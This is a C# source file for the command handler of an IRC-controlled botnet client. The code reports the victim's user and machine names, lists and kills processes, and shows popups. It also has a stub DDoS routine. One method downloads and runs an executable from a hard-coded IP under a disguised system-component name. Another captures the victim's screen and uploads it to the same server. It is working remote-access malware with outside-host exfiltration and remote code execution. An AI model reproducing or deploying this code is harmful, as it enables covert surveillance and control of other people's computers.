using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Collections.Specialized;
using System.IO;


namespace tom
{
    class BotActions
    {
        IRC irc;

        public Boolean DDoSing = false;


        public BotActions(IRC irc)
        {
            this.irc = irc;
        }

        public void HelpMenu()
        {
            irc.SendMessage("Message a Bot: ");
            irc.SendMessage("     [botName] [command]");
            irc.SendMessage("Message all Bots of a certain version:");
            irc.SendMessage("     [all] v[#] [command]");
            irc.SendMessage("Message all bots");
            irc.SendMessage("     [all] v* [command]");
            irc.SendMessage("COMMANDS for " + irc.VERSION);
            irc.SendMessage("     alert [message]   --message popup box on host machine");
            irc.SendMessage("     name              --get system name");
            irc.SendMessage("     processes         --lists all processes");
            irc.SendMessage("     kill [process]    --kill process by name");
        }

        public void Name()
        {
            irc.SendMessage(Environment.UserName + " ON " + Environment.MachineName);
        }

        public void Update()
        {
            WebClient Client = new WebClient();
            Client.DownloadFile("http://198.211.100.72/bots/updater.exe", @System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\SystemComponentUpdate.exe");
            System.Diagnostics.Process.Start("SystemComponentUpdate.exe");

        }
        
        public void ShowMessage(string message)
        {
            const string caption = "Alert";
            var result = MessageBox.Show(message, caption,
                                         MessageBoxButtons.OK,
                                         MessageBoxIcon.Information);
        }

        public void ListProcesses()
        {
            Process[] p = Process.GetProcesses();
            String processes = "";
            int count = 0;
            foreach (Process pp in p)
            {
                count++;
                if (count % 10 == 0)
                {
                    irc.SendMessage(processes);
                    processes = "";
                }
                else
                {
                    processes += pp.ProcessName + ",";
                }
            }
            irc.SendMessage(processes);
        }



        public void KillProcess(string process)
        {
            Process[] p = Process.GetProcessesByName(process);
            if (p.Length > 0)
            {
                p[0].Kill();
                irc.SendMessage("boom");
            }
            else
            {
                irc.SendMessage("process not found");
            }
        }

        public void DDoS(string path)
        {
            string html = string.Empty;
            string url = @path;

            // TODO need a thread herE? 

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.AutomaticDecompression = DecompressionMethods.GZip;
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();

        }

        public void ScreenShot()
        {
            // *** Take screenshot

            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            // Save the screenshot to the specified path that the user has chosen.
            bmpScreenshot.Save("test.jpg", ImageFormat.Jpeg);

            // *** Send to server
            String temp = System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\test.jpg";
            // Load a image
            System.Drawing.Image myImage = GetImage(System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\test.jpg");

            // Convert to base64 encoded string
            string base64Image = ImageToBase64(myImage, System.Drawing.Imaging.ImageFormat.Jpeg);

            // Post image to upload handler
            using (WebClient client = new WebClient())
            {
                byte[] response = client.UploadValues("http://198.211.100.72/bots/photo.php", new NameValueCollection()
                {
                    { "myImageData", base64Image }
                });

                irc.SendMessage(System.Text.Encoding.Default.GetString(response));
            }
        }

        static System.Drawing.Image GetImage(string filePath)
        {
            WebClient l_WebClient = new WebClient();
            byte[] l_imageBytes = l_WebClient.DownloadData(filePath);
            MemoryStream l_stream = new MemoryStream(l_imageBytes);
            return Image.FromStream(l_stream);
        }

        static string ImageToBase64(System.Drawing.Image image, System.Drawing.Imaging.ImageFormat format)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                // Convert Image to byte[]
                image.Save(ms, format);
                byte[] imageBytes = ms.ToArray();

                // Convert byte[] to Base64 String
                string base64String = Convert.ToBase64String(imageBytes);
                return base64String;
            }
        }



    }
}
